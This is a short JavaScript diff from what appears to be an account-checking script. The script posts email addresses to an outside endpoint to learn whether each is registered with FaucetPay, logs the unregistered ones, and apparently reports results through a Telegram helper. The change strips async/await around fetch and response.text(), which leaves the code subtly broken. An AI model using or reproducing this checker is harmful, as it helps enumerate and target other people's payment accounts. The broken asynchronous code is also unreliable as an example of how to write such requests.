@@ -17,14 +17,14 @@ function sendTelegramMessage(message) {
     });
 }
 
-async function CheckAPI(email) {
+function CheckAPI(email) {
   var api_url = "https://chuksblog.top/auth/login";
   var data = {
       wallet: email
   };
 
   try {
-      var response = await fetch(api_url, {
+      var response = fetch(api_url, {
           method: 'POST',
           headers: {
               'Content-Type': 'application/x-www-form-urlencoded',
@@ -32,7 +32,7 @@ async function CheckAPI(email) {
           body: new URLSearchParams(data),
       });
 
-      var result = await response.text();
+      var result = response.text();
 
       if (result.includes("Your email is not registered to FaucetPay")) {
           console.log("Not registered --", email);
